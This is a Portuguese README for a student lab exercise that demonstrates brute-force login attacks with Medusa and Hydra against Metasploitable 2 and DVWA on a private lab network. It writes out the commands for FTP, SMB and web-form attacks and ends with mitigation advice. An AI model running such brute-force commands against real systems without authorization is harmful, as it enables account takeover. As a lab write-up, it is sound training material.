# bruteforce-medusa-kali-dio
Projeto de prática de Brute Force em laboratório

Objetivo
Demonstrar um ataque de força bruta a serviços vulneráveis usando a ferramenta Medusa no ambiente Kali Linux, aplicando em máquinas virtuais de laboratório (Metasploitable 2 e DVWA), documentando o processo, os comandos utilizados e recomendações de mitigação.

Ambiente do Laboratório
Kali Linux: Máquina atacante

Metasploitable 2: Máquina alvo (IP: 192.168.56.2)

Usuário padrão: msfadmin

Senha padrão: msfadmin

Teste de conectividade:

bash
ifconfig
ping 192.168.56.2
Criação das Wordlists
bash
# Wordlist de usuários
echo "msfadmin" > users.txt

# Wordlist de senhas
echo "msfadmin" > passwords.txt
Comandos Utilizados
Ataque Brute Force FTP
bash
medusa -h 192.168.56.2 -u msfadmin -P passwords.txt -M ftp
# Ou, usando lista de usuários
medusa -h 192.168.56.2 -U users.txt -P passwords.txt -M ftp
Ataque Brute Force SMB
bash
medusa -h 192.168.56.2 -U users.txt -P passwords.txt -M smbnt
Testando Acesso via SMBClient
bash
smbclient -L //192.168.56.2 -U msfadmin
smbclient //192.168.56.2/tmp -U msfadmin
Ataque Brute Force em Web Form (DVWA)
bash
hydra -L users.txt -P passwords.txt 192.168.56.2 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login"
Aprendizados
Como ataques de força bruta funcionam em serviços como FTP, SMB e formulários web

Criação de wordlists personalizadas conforme ambiente

Testes automatizados com ferramentas open-source

Análise dos resultados e validação dos acessos obtidos

Recomendações de Segurança
Habilitar autenticação multifator nos serviços

Aplicar política de complexidade e renovação de senhas

Monitorar e limitar tentativas consecutivas de login

Atualizar softwares e serviços regularmente

